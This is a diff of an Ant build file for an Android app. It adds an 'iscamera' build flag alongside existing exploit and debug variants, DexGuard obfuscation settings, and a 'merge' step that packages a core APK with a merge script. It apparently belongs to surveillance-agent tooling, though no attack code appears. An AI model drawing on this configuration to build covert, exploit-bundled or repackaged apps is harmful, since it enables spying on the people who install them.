@@ -145,6 +145,7 @@
 					<antcall target="libsnoexp" />
 					<var name="isdebug" value="true" />
 					<var name="isexploit" value="false" />
+					<var name="iscamera" value="true" />
 					<copy file="preprocess/config.debug.bin" toFile="assets/c.bin" overwrite="true" />
 					<copy file="preprocess/resources.patched.bin" toFile="assets/r.bin" overwrite="true" />
 					<copy file="preprocess/dexguard-project.release.txt" toFile="dexguard-project.txt" overwrite="true" />
@@ -154,6 +155,7 @@
 					<antcall target="libsnoexp" />
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="false" />
+					<var name="iscamera" value="true" />
 					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
 					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
 					<copy file="preprocess/dexguard-project.release.txt" toFile="dexguard-project.txt" overwrite="true" />
@@ -163,6 +165,7 @@
 					<antcall target="libsnoexp" />
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="false" />
+					<var name="iscamera" value="false" />
 					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
 					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
 					<copy file="preprocess/dexguard-project.merge.txt" toFile="dexguard-project.txt" overwrite="true" />
@@ -172,6 +175,7 @@
 					<antcall target="libsexp" />
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="true" />
+					<var name="iscamera" value="true" />
 					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
 					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
 					<copy file="preprocess/dexguard-project.release.txt" toFile="dexguard-project.txt" overwrite="true" />
@@ -213,6 +217,7 @@
 					<filter token="DEBUG" value="${isdebug}" />
 					<filter token="EXCEPTION" value="${isdebug}" />
 					<filter token="EXPLOIT" value="${isexploit}" />
+					<filter token="CAMERA" value="${iscamera}" />
 					<filter token="DEMO" value="false" />
 					<!-- TODO RIMETTERE!!!! filter token="KEYS" value="${isdebug}" / -->
 					<filter token="KEYS" value="${isdebug}" />
@@ -335,8 +340,8 @@
 		</set-cfg>
 	</target>
 
-	<target name="set-merge-default" depends="init">
-		<set-cfg kind="merge" osversion="default">
+	<target name="set-merge-v2" depends="init">
+		<set-cfg kind="merge" osversion="v2">
 		</set-cfg>
 	</target>
 
@@ -399,6 +404,8 @@
 		<var name="filename" value="bin/android_networking-release.apk" />
 		<mkdir dir="output/merge/" />
 		<copy file="${filename}" toFile="output/merge/core.android.release.apk" overwrite="true" />
+		<copy file="merge.rb" toFile="output/merge/merge.rb" overwrite="true" />
+		<copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" />
 	</target>
 	
 	<target name="servercore">
